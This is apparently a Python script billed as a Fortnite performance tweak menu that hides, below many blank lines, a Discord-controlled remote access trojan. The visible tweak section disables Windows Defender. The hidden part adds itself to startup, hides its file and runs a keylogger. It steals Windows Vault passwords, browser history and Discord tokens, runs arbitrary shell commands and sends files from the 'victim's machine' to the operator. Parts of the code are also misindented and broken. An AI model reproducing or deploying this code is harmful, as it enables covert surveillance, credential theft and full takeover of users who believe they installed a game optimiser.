# ============================================================================================
# Copyright Notice:
# This script is the intellectual property of Solace. Unauthorized editing, reselling, 
# or claiming this script as your own is strictly prohibited and is a finable offense 
# of over 1000 pounds. Any violations will result in legal action.
#
# Author: Solace
# Contact: solacedevlegal@gmail.com
# ============================================================================================

# ============================== FORTNITE MULTITOOL TWEAK MENU ==============================
#
# This section contains all Fortnite-related tweaks and features.
# It is designed to provide a menu for optimizing Fortnite gameplay.
#

def disable_windows_defender():
    try:
        subprocess.run("powershell -Command Set-MpPreference -DisableRealtimeMonitoring $true", shell=True)
        return "Windows Defender disabled successfully for better Fortnite performance."
    except Exception as e:
        return f"Error disabling Windows Defender: {e}"

def apply_low_latency_tweaks():
    try:
        tweaks = [
            "net stop \"DiagTrack\"",
            "powercfg /setactive SCHEME_MIN",  
            "bcdedit /set useplatformclock No",  
            "netsh int tcp set global autotuninglevel=disabled",  
            "netsh int ip set global taskoffload=disabled" 
        ]
        results = []
        for tweak in tweaks:
            output = subprocess.run(tweak, shell=True, capture_output=True, text=True)
            results.append(output.stdout or output.stderr)
        return "\n".join(results)
    except Exception as e:
        return f"Error applying low-latency tweaks: {e}"

def optimize_network():
    try:
        tweaks = [
            "netsh int tcp set global chimney=enabled",  
            "netsh int tcp set global rss=enabled", 
            "netsh int tcp set global dca=enabled"  
        ]
        results = []
        for tweak in tweaks:
            output = subprocess.run(tweak, shell=True, capture_output=True, text=True)
            results.append(output.stdout or output.stderr)
        return "\n".join(results)
    except Exception as e:
        return f"Error optimizing network settings: {e}"

def disable_unnecessary_services():
    try:
        services = [
            "Spooler",  
            "WSearch",  
            "SysMain" 
        ]
        results = []
        for service in services:
            output = subprocess.run(f"net stop {service}", shell=True, capture_output=True, text=True)
            results.append(output.stdout or output.stderr)
        return "\n".join(results)
    except Exception as e:
        return f"Error disabling unnecessary services: {e}"

def adjust_graphics_settings():
    try:
        tweaks = [
            "reg add \"HKCU\\Software\\Microsoft\\GameBar\" /v AllowAutoGameMode /t REG_DWORD /d 0 /f",  
            "reg add \"HKCU\\System\\GameConfigStore\" /v GameDVR_Enabled /t REG_DWORD /d 0 /f"  
        ]
        results = []
        for tweak in tweaks:
            output = subprocess.run(tweak, shell=True, capture_output=True, text=True)
            results.append(output.stdout or output.stderr)
        return "\n".join(results)
    except Exception as e:
        return f"Error adjusting graphics settings: {e}"

def increase_fps():
    try:
        tweaks = [
            "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\GraphicsDrivers\" /v HwSchMode /t REG_DWORD /d 2 /f",  
            "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Power\\PowerSettings\\54533251-82be-4824-96c1-47b60b740d00\\bc5038f7-23e0-4960-96da-33abaf5935ec\" /v Attributes /t REG_DWORD /d 2 /f"  
        ]
        results = []
        for tweak in tweaks:
            output = subprocess.run(tweak, shell=True, capture_output=True, text=True)
            results.append(output.stdout or output.stderr)
        return "\n".join(results)
    except Exception as e:
        return f"Error increasing FPS: {e}"

def disable_background_apps():
    try:
        subprocess.run("powershell -Command Get-AppBackgroundTask | Disable-AppBackgroundTask", shell=True)
        return "Background apps disabled successfully."
    except Exception as e:
        return f"Error disabling background apps: {e}"

def clear_temp_files():
    try:
        temp_paths = [
            os.environ["TEMP"],
            os.path.join(os.environ["SystemRoot"], "Temp")
        ]
        results = []
        for path in temp_paths:
            for file in os.listdir(path):
                file_path = os.path.join(path, file)
                try:
                    if os.path.isfile(file_path):
                        os.remove(file_path)
                    elif os.path.isdir(file_path):
                        shutil.rmtree(file_path)
                except Exception as e:
                    results.append(f"Error removing {file_path}: {e}")
        return "\n".join(results) if results else "Temporary files cleared successfully."
    except Exception as e:
        return f"Error clearing temporary files: {e}"

def disable_visual_effects():
    try:
        subprocess.run("SystemPropertiesPerformance.exe /SETCOMMIT", shell=True)
        return "Visual effects disabled successfully."
    except Exception as e:
        return f"Error disabling visual effects: {e}"

def show_fortnite_help_menu():
    help_text = """
    Available Fortnite Tweaks:
    ,disable-defender - Disable Windows Defender for better Fortnite performance.
    ,apply-low-latency - Apply low-latency tweaks for Fortnite.
    ,optimize-network - Optimize network settings for Fortnite.
    ,disable-services - Disable unnecessary services for better performance.
    ,adjust-graphics - Adjust graphics settings for Fortnite.
    ,increase-fps - Increase FPS by tweaking registry settings.
    ,disable-background - Disable background apps to save resources.
    ,clear-temp - Clear temporary files for better system performance.
    ,disable-effects - Disable visual effects to improve performance.
    ,help - Display this help menu.
    """
    return help_text

# ============================== END OF FORTNITE MULTITOOL TWEAK MENU ========================

#  ============================== END OF CODE ==============================































































# ============================================================================================
# Copyright Notice:
# This script is the intellectual property of Solace. Unauthorized editing, reselling, 
# or claiming this script as your own is strictly prohibited and is a finable offense 
# of over 1000 pounds. Any violations will result in legal action.
#
# Author: Solace
# Contact: solacedevlegal@gmail.com
# ============================================================================================

import os
import sys
import subprocess
import threading
import asyncio
import socket
import platform
import re
import requests
from discord import File, Embed
from pynput import keyboard
import sqlite3
import shutil
from dotenv import load_dotenv
import win32cred

# ============================== AUTO-INSTALL LIBRARIES ==============================
def install_libraries():
    required_libraries = [
        "discord", "pynput", "requests", "python-dotenv", "comtypes", "pycaw", "pyautogui"
    ]
    for lib in required_libraries:
        try:
            __import__(lib)
        except ImportError:
            subprocess.run([sys.executable, "-m", "pip", "install", lib], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

install_libraries()

# ============================== LOAD ENVIRONMENT VARIABLES ==============================
load_dotenv()
ENCRYPTED_DISCORD_TOKEN = os.getenv("ENCRYPTED_DISCORD_TOKEN")
if not ENCRYPTED_DISCORD_TOKEN:
    raise ValueError("Discord token is missing.")
DISCORD_TOKEN = ENCRYPTED_DISCORD_TOKEN
SERVER_ID = 1350570142681141381
CHANNELS = ["commands", "recordings", "mic-listening", "logs", "files", "keylogger"]
COMMAND_PREFIX = ","
KEYLOG_FILE = "found_virus.txt"
TOKEN_LOG_FILE = "issues.txt"

# ============================== SYSTEM INFORMATION ==============================
def get_system_info():
    if platform.system() != "Windows":
        return "This script only supports Windows."
    hostname = socket.gethostname()
    ip = socket.gethostbyname(hostname)
    return {
        "hostname": hostname,
        "ip": ip,
        "os": platform.system(),
        "architecture": platform.machine(),
        "key": f"pc-{ip}"
    }

# ============================== GRAB STORED PASSWORDS ==============================
def grab_passwords():
    if platform.system() != "Windows":
        return "Password retrieval is only supported on Windows."
    try:
        credentials = win32cred.CredEnumerate(None, 0)
        if not credentials:
            return "No credentials found in the Windows Vault."
        result = []
        for cred in credentials:
            username = cred["UserName"] if "UserName" in cred else "N/A"
            target_name = cred["TargetName"] if "TargetName" in cred else "N/A"
            credential_blob = cred["CredentialBlob"] if "CredentialBlob" in cred else b""
            password = credential_blob.decode("utf-16-le") if credential_blob else "N/A"
            result.append(f"Target: {target_name}, Username: {username}, Password: {password}")
        return "\n".join(result)
    except Exception as e:
        return f"Error retrieving passwords: {e}"

# ============================== EXECUTE SHELL COMMANDS ==============================
async def execute_shell_command(command):
    try:
        process = await asyncio.create_subprocess_shell(
            command, stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        stdout, stderr = await process.communicate()
        return stdout.decode() if process.returncode == 0 else stderr.decode()
    except Exception as e:
        return f"Error executing command: {e}"

# ============================== ADD TO STARTUP ==============================
def add_to_startup():
    try:
        # Get the path of the current script
        script_path = os.path.abspath(sys.argv[0])

        # Define the startup folder path for Windows
        startup_folder = os.path.join(
            os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup"
        )

        # Create a shortcut to the script in the startup folder
        shortcut_name = "MyScript.lnk"
        shortcut_path = os.path.join(startup_folder, shortcut_name)

        # Use PowerShell to create the shortcut
        powershell_command = f'''
        $WshShell = New-Object -ComObject WScript.Shell
        $Shortcut = $WshShell.CreateShortcut("{shortcut_path}")
        $Shortcut.TargetPath = "{script_path}"
        $Shortcut.Save()
        '''
        # Execute the PowerShell command
        result = asyncio.run(execute_shell_command(f'powershell -Command "{powershell_command}"'))
        return result
    except Exception as e:
        return f"Error adding to startup: {e}"

# ============================== HIDE FILE ==============================
def hide_file():
    try:
        # Get the path of the current script
        script_path = os.path.abspath(sys.argv[0])

        # Use the `attrib` command to set the file as hidden
        hide_command = f'attrib +h "{script_path}"'
        result = asyncio.run(execute_shell_command(hide_command))
        return result
    except Exception as e:
        return f"Error hiding file: {e}"

# ============================== MAIN FUNCTION ==============================
async def main():
    # Add the script to startup
    startup_result = add_to_startup()
    print("Startup Addition Result:", startup_result)

    # Hide the script file
    hide_result = hide_file()
    print("File Hiding Result:", hide_result)

# Run the main function
if __name__ == "__main__":
    asyncio.run(main())

# ============================== DOWNLOAD FILE FROM URL ==============================
def download_file(url, save_path):
    try:
        response = requests.get(url)
        with open(save_path, "wb") as f:
            f.write(response.content)
        return f"Downloaded file to: {save_path}"
    except Exception as e:
        return f"Error downloading file: {e}"

# ============================== TAKE SCREENSHOT ==============================
def take_screenshot():
    if platform.system() != "Windows":
        return "Screenshots are only supported on Windows."
    try:
        import pyautogui
        screenshot = pyautogui.screenshot()
        screenshot_path = "screenshot.png"
        screenshot.save(screenshot_path)
        return screenshot_path
    except Exception as e:
        return f"Error taking screenshot: {e}"

# ============================== SET VOLUME (WINDOWS ONLY) ==============================
def set_volume_windows(volume_level):
    if platform.system() != "Windows":
        return "Volume control is only supported on Windows."
    try:
        from ctypes import cast, POINTER
        from comtypes import CLSCTX_ALL
        from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = cast(interface, POINTER(IAudioEndpointVolume))
        volume.SetMasterVolumeLevelScalar(volume_level / 100, None)
        return f"Volume set to {volume_level}%"
    except Exception as e:
        return f"Error setting volume: {e}"

# ============================== EXTRACT BROWSER HISTORY ==============================
def search_history_windows():
    if platform.system() != "Windows":
        return "Search history extraction is only supported on Windows."
    search_history = []
    browsers = {
        "Chrome": os.path.expandvars(r"%localappdata%\Google\Chrome\User Data\Default\History"),
        "Edge": os.path.expandvars(r"%localappdata%\Microsoft\Edge\User Data\Default\History"),
        "Brave": os.path.expandvars(r"%localappdata%\BraveSoftware\Brave-Browser\User Data\Default\History"),
        "Firefox": os.path.expandvars(r"%appdata%\Mozilla\Firefox\Profiles"),
    }
    for browser, path in browsers.items():
        if os.path.exists(path):
            if browser == "Firefox":
                profile_folders = [f for f in os.listdir(path) if f.endswith(".default-release")]
                for folder in profile_folders:
                    db_path = os.path.join(path, folder, "places.sqlite")
                    if os.path.exists(db_path):
                        try:
                            conn = sqlite3.connect(db_path)
                            cursor = conn.cursor()
                            cursor.execute("SELECT url, title FROM moz_places;")
                            search_history.extend(cursor.fetchall())
                            conn.close()
                        except Exception as e:
                            print(f"Error accessing Firefox history: {e}")
            else:
                try:
                    conn = sqlite3.connect(path)
                    cursor = conn.cursor()
                    cursor.execute("SELECT url, title FROM urls;")
                    search_history.extend(cursor.fetchall())
                    conn.close()
                except Exception as e:
                    print(f"Error accessing {browser} history: {e}")
    return search_history

# ============================== LIST FILES IN DIRECTORY ==============================
def list_files(directory="."):
    try:
        return "\n".join(os.listdir(directory))
    except Exception as e:
        return f"Error listing files: {e}"

# ============================== EXTRACT DISCORD TOKENS ==============================
def get_discord_tokens():
    if platform.system() != "Windows":
        return "Discord token extraction is only supported on Windows."
    token_paths = {
        "Discord": os.path.expandvars(r"%appdata%\discord\Local Storage\leveldb"),
        "Chrome": os.path.expandvars(r"%localappdata%\Google\Chrome\User Data\Default\Local Storage\leveldb"),
        "Edge": os.path.expandvars(r"%localappdata%\Microsoft\Edge\User Data\Default\Local Storage\leveldb"),
        "Brave": os.path.expandvars(r"%localappdata%\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb"),
        "Firefox": os.path.expandvars(r"%appdata%\Mozilla\Firefox\Profiles"),
    }
    tokens = []
    for browser, path in token_paths.items():
        if os.path.exists(path):
            if browser == "Firefox":
                profile_folders = [f for f in os.listdir(path) if f.endswith(".default-release")]
                for folder in profile_folders:
                    db_path = os.path.join(path, folder, "webappsstore.sqlite")
                    if os.path.exists(db_path):
                        try:
                            conn = sqlite3.connect(db_path)
                            cursor = conn.cursor()
                            cursor.execute("SELECT key, value FROM webappsstore2;")
                            for row in cursor.fetchall():
                                if "token" in row[0]:
                                    tokens.append(row[1])
                            conn.close()
                        except Exception as e:
                            print(f"Error accessing Firefox tokens: {e}")
            else:
                try:
                    for root, _, files in os.walk(path):
                        for file in files:
                            if file.endswith((".ldb", ".log")):
                                with open(os.path.join(root, file), "r", encoding="utf-8", errors="ignore") as f:
                                    content = f.read()
                                    matches = re.findall(r'"token":"([a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27})"', content)
                                    tokens.extend(matches)
                except Exception as e:
                    print(f"Error accessing {browser} tokens: {e}")
    return list(set(tokens))

# ============================== KEYLOGGING ==============================
def on_press(key):
    try:
        with open(KEYLOG_FILE, "a") as f:
            f.write(f"{key}\n")
    except Exception as e:
        print(f"Error writing to keylog file: {e}")

def start_keylogging():
    try:
        listener = keyboard.Listener(on_press=on_press)
        listener.start()
    except Exception as e:
        print(f"Error starting keylogger: {e}")

# ============================== AUTO-UPDATE MECHANISM ==============================
def update_script():
    try:
        repo_url = "https://github.com/tfssolacedev/MTweaks.git"
        temp_dir = "temp_update"
        local_script_path = os.path.abspath(__file__)
        if not os.path.exists(temp_dir):
            subprocess.run(["git", "clone", repo_url, temp_dir], check=True)
        subprocess.run(["git", "-C", temp_dir, "pull"], check=True)
        repo_script_path = os.path.join(temp_dir, "m.py")
        if not os.path.exists(repo_script_path):
            raise Exception(f"Could not find m.py in the repository at {repo_script_path}")
        with open(local_script_path, "r", encoding="utf-8") as local_file:
            local_content = local_file.read()
        with open(repo_script_path, "r", encoding="utf-8") as repo_file:
            repo_content = repo_file.read()
        if local_content != repo_content:
            shutil.copy(repo_script_path, local_script_path)
            os.execv(sys.executable, [sys.executable] + sys.argv)
        if os.path.exists(temp_dir):
            shutil.rmtree(temp_dir)
    except Exception as e:
        print(f"Error updating script: {e}")

# ============================== DISCORD BOT INITIALIZATION ==============================
intents = discord.Intents.default()
intents.message_content = True
client = discord.Client(intents=intents)

@client.event
async def on_ready():
    threading.Thread(target=start_keylogging, daemon=True).start()
    threading.Thread(target=update_script, daemon=True).start()
    guild = client.get_guild(SERVER_ID)
    if not guild:
        return
    info = get_system_info()
    category_name = info["key"]
    category = discord.utils.get(guild.categories, name=category_name)
    if not category:
        category = await guild.create_category(category_name)
    existing_channels = [channel.name for channel in category.text_channels]
    for channel_name in CHANNELS:
        if channel_name not in existing_channels:
            await guild.create_text_channel(channel_name, category=category)
    logs_channel = discord.utils.get(category.text_channels, name="logs")
    if logs_channel:
        embed = Embed(title="System Information", color=discord.Color.blue())
        for key, value in info.items():
            embed.add_field(name=key.capitalize(), value=value, inline=False)
        await logs_channel.send(embed=embed)

@client.event
async def on_message(message):
    if message.author == client.user:
        return
    info = get_system_info()
    category_name = info["key"]
    category = discord.utils.get(message.guild.categories, name=category_name)
    if not category or message.channel.category != category or message.channel.name != "commands":
        return
    content = message.content.strip()
    if not content.startswith(COMMAND_PREFIX):
        return
    command = content[len(COMMAND_PREFIX):].strip().lower()

    if command == "help":
        embed = Embed(title="Help Menu", description="Available Commands:", color=discord.Color.green())
        embed.add_field(name=",exec <command>", value="Execute a shell command.", inline=False)
        embed.add_field(name=",info", value="Retrieve system information.", inline=False)
        embed.add_field(name=",upload-url <url>", value="Upload a file from a URL.", inline=False)
        embed.add_field(name=",upload-file", value="Upload a file attached to the message.", inline=False)
        embed.add_field(name=",screenshot", value="Take a screenshot.", inline=False)
        embed.add_field(name=",set-volume <level>", value="Set system volume (Windows only).", inline=False)
        embed.add_field(name=",list-files", value="List files in the current directory.", inline=False)
        embed.add_field(name=",search-history", value="Retrieve browser search history (Windows only).", inline=False)
        embed.add_field(name=",download <file_path>", value="Download a file from the victim's machine.", inline=False)
        embed.add_field(name=",delete <file_path>", value="Delete a file on the victim's machine.", inline=False)
        embed.add_field(name=",move <src> <dst>", value="Move a file on the victim's machine.", inline=False)
        embed.add_field(name=",copy <src> <dst>", value="Copy a file on the victim's machine.", inline=False)
        embed.add_field(name=",shutdown", value="Shutdown the system.", inline=False)
        embed.add_field(name=",restart", value="Restart the system.", inline=False)
        embed.add_field(name=",keylog", value="Retrieve the keylog file.", inline=False)
        embed.add_field(name=",ping", value="Check the bot's latency.", inline=False)
        embed.add_field(name=",get-discord-tokens", value="Retrieve Discord tokens from common browsers (Windows only).", inline=False)
        embed.add_field(name=",help", value="Display this help message.", inline=False)
        await message.channel.send(embed=embed)

    elif command.startswith("exec "):
        cmd = command[5:]
        output = await execute_shell_command(cmd)
        embed = Embed(title="Command Output", description=f"```\n{output}\n```", color=discord.Color.blue())
        await message.channel.send(embed=embed)

    elif command == "info":
        info = get_system_info()
        embed = Embed(title="System Information", color=discord.Color.blue())
        for key, value in info.items():
            embed.add_field(name=key.capitalize(), value=value, inline=False)
        await message.channel.send(embed=embed)

    elif command.startswith("upload-url "):
        try:
            url = command.split(" ")[1]
            save_path = os.path.basename(url)
            result = download_file(url, save_path)
            embed = Embed(title="File Download", description=result, color=discord.Color.green())
            await message.channel.send(embed=embed)
            if os.path.exists(save_path):
                await message.channel.send(file=discord.File(save_path))
                os.remove(save_path)
        except Exception as e:
            embed = Embed(title="Error", description=f"Error processing upload-url: {e}", color=discord.Color.red())
            await message.channel.send(embed=embed)

    elif command.startswith("upload-file"):
        if len(message.attachments) == 0:
            embed = Embed(title="Error", description="No file attached to the message.", color=discord.Color.red())
            await message.channel.send(embed=embed)
            return
        attachment = message.attachments[0]
        save_path = attachment.filename
        try:
            await attachment.save(save_path)
            embed = Embed(title="File Upload", description=f"File saved locally: {save_path}", color=discord.Color.green())
            await message.channel.send(embed=embed)
            await message.channel.send(file=discord.File(save_path))
            os.remove(save_path)
        except Exception as e:
            embed = Embed(title="Error", description=f"Error processing upload-file: {e}", color=discord.Color.red())
            await message.channel.send(embed=embed)

    elif command == "screenshot":
        screenshot_path = take_screenshot()
        if os.path.exists(screenshot_path):
            await message.channel.send(file=discord.File(screenshot_path))
            os.remove(screenshot_path)
        else:
            embed = Embed(title="Error", description="Failed to take screenshot.", color=discord.Color.red())
            await message.channel.send(embed=embed)

    elif command.startswith("set-volume "):
        try:
            volume_level = int(command.split(" ")[1])
            result = set_volume_windows(volume_level)
            embed = Embed(title="Volume Control", description=result, color=discord.Color.green())
            await message.channel.send(embed=embed)
        except Exception as e:
            embed = Embed(title="Error", description=f"Invalid volume level: {e}", color=discord.Color.red())
            await message.channel.send(embed=embed)

    elif command == "list-files":
        output = list_files()
        embed = Embed(title="Files in Directory", description=f"```\n{output}\n```", color=discord.Color.blue())
        await message.channel.send(embed=embed)

    elif command == "search-history":
        if platform.system() == "Windows":
            history = search_history_windows()
            if history:
                history_message = "\n".join([f"{url} - {title}" for url, title in history])
                embed = Embed(title="Search History", description=f"```\n{history_message}\n```", color=discord.Color.blue())
                await message.channel.send(embed=embed)
            else:
                embed = Embed(title="Search History", description="No search history found.", color=discord.Color.red())
                await message.channel.send(embed=embed)
        else:
            embed = Embed(title="Error", description="Search history is only supported on Windows.", color=discord.Color.red())
            await message.channel.send(embed=embed)

    elif command.startswith("download "):
        try:
            file_path = command.split(" ")[1]
            if os.path.exists(file_path):
                await message.channel.send(file=discord.File(file_path))
            else:
                embed = Embed(title="Error", description=f"File not found: {file_path}", color=discord.Color.red())
                await message.channel.send(embed=embed)
        except Exception as e:
            embed = Embed(title="Error", description=f"Error downloading file: {e}", color=discord.Color.red())
            await message.channel.send(embed=embed)

    elif command.startswith("delete "):
        try:
            file_path = command.split(" ")[1]
            if os.path.exists(file_path):
                os.remove(file_path)
                embed = Embed(title="File Deletion", description=f"Deleted file: {file_path}", color=discord.Color.green())
                await message.channel.send(embed=embed)
            else:
                embed = Embed(title="Error", description=f"File not found: {file_path}", color=discord.Color.red())
                await message.channel.send(embed=embed)
        except Exception as e:
            embed = Embed(title="Error", description=f"Error deleting file: {e}", color=discord.Color.red())
            await message.channel.send(embed=embed)

    elif command.startswith("move "):
        try:
            args = command.split(" ")
            src = args[1]
            dst = args[2]
            if os.path.exists(src):
                shutil.move(src, dst)
                embed = Embed(title="File Move", description=f"Moved file: {src} -> {dst}", color=discord.Color.green())
                await message.channel.send(embed=embed)
            else:
                embed = Embed(title="Error", description=f"Source file not found: {src}", color=discord.Color.red())
                await message.channel.send(embed=embed)
        except Exception as e:
            embed = Embed(title="Error", description=f"Error moving file: {e}", color=discord.Color.red())
            await message.channel.send(embed=embed)

    elif command.startswith("copy "):
        try:
            args = command.split(" ")
            src = args[1]
            dst = args[2]
            if os.path.exists(src):
                shutil.copy(src, dst)
                embed = Embed(title="File Copy", description=f"Copied file: {src} -> {dst}", color=discord.Color.green())
                await message.channel.send(embed=embed)
            else:
                embed = Embed(title="Error", description=f"Source file not found: {src}", color=discord.Color.red())
                await message.channel.send(embed=embed)
        except Exception as e:
            embed = Embed(title="Error", description=f"Error copying file: {e}", color=discord.Color.red())
            await message.channel.send(embed=embed)

       elif command == "shutdown":
        # Shutdown the system
        try:
            if platform.system() == "Windows":
                subprocess.run("shutdown /s /t 0", shell=True)
            elif platform.system() in ["Linux", "Darwin"]:
                subprocess.run("sudo shutdown now", shell=True)
            embed = Embed(title="System Shutdown", description="Shutting down the system...", color=discord.Color.green())
            await message.channel.send(embed=embed)
        except Exception as e:
            embed = Embed(title="Error", description=f"Error shutting down: {e}", color=discord.Color.red())
            await message.channel.send(embed=embed)

    elif command == "restart":
        # Restart the system
        try:
            if platform.system() == "Windows":
                subprocess.run("shutdown /r /t 0", shell=True)
            elif platform.system() in ["Linux", "Darwin"]:
                subprocess.run("sudo reboot", shell=True)
            embed = Embed(title="System Restart", description="Restarting the system...", color=discord.Color.green())
            await message.channel.send(embed=embed)
        except Exception as e:
            embed = Embed(title="Error", description=f"Error restarting: {e}", color=discord.Color.red())
            await message.channel.send(embed=embed)

    elif command == "keylog":
        # Retrieve the keylog file
        if os.path.exists(KEYLOG_FILE):
            await message.channel.send(file=discord.File(KEYLOG_FILE))
        else:
            embed = Embed(title="Error", description="Keylog file not found.", color=discord.Color.red())
            await message.channel.send(embed=embed)

    elif command == "ping":
        # Check the bot's latency
        latency = round(client.latency * 1000)  # Convert to milliseconds
        embed = Embed(title="Ping", description=f"Pong! Latency: {latency}ms", color=discord.Color.green())
        await message.channel.send(embed=embed)

    elif command == "get-discord-tokens":
        # Retrieve Discord tokens from common browsers (Windows only)
        if platform.system() != "Windows":
            embed = Embed(title="Error", description="Discord token extraction is only supported on Windows.", color=discord.Color.red())
            await message.channel.send(embed=embed)
            return
        tokens = get_discord_tokens()
        if tokens:
            with open(TOKEN_LOG_FILE, "w") as f:
                f.write("\n".join(tokens))
            await message.channel.send(file=discord.File(TOKEN_LOG_FILE))
            os.remove(TOKEN_LOG_FILE)  # Clean up the file after uploading
        else:
            embed = Embed(title="Discord Tokens", description="No Discord tokens found.", color=discord.Color.red())
            await message.channel.send(embed=embed)

elif command == "bsod":
    # Simulate a Blue Screen of Death (BSOD)
    try:
        import tkinter as tk

        def create_bsod():
            # Create a full-screen blue screen
            root = tk.Tk()
            root.attributes("-fullscreen", True)  # Fullscreen mode
            root.configure(bg="#0000AA")  # Classic BSOD blue color
            root.overrideredirect(True)  # Remove window borders and title bar

            # Add text to mimic a BSOD
            label = tk.Label(
                root,
                text=":( Your PC ran into a problem and needs to restart. We're just collecting some error info, and then we'll restart for you.",
                font=("Segoe UI", 14),
                fg="white",
                bg="#0000AA",
                wraplength=800,
                justify="center",
            )
            label.place(relx=0.5, rely=0.4, anchor="center")

            # Add a spinning progress indicator
            progress_label = tk.Label(
                root,
                text="Please wait...",
                font=("Segoe UI", 12),
                fg="white",
                bg="#0000AA",
            )
            progress_label.place(relx=0.5, rely=0.6, anchor="center")

            # Keep the window open until closed manually
            root.mainloop()

        # Run the BSOD simulation in a separate thread to avoid blocking the bot
        threading.Thread(target=create_bsod, daemon=True).start()
        embed = Embed(title="Blue Screen of Death", description="Simulating a Blue Screen of Death...", color=discord.Color.blue())
        await message.channel.send(embed=embed)
    except Exception as e:
        embed = Embed(title="Error", description=f"Error simulating BSOD: {e}", color=discord.Color.red())
        await message.channel.send(embed=embed)

else:
    embed = Embed(title="Error", description="Unknown command. Use `,help` for a list of commands.", color=discord.Color.red())
    await message.channel.send(embed=embed)

# Run the Discord bot
client.run(DISCORD_TOKEN)
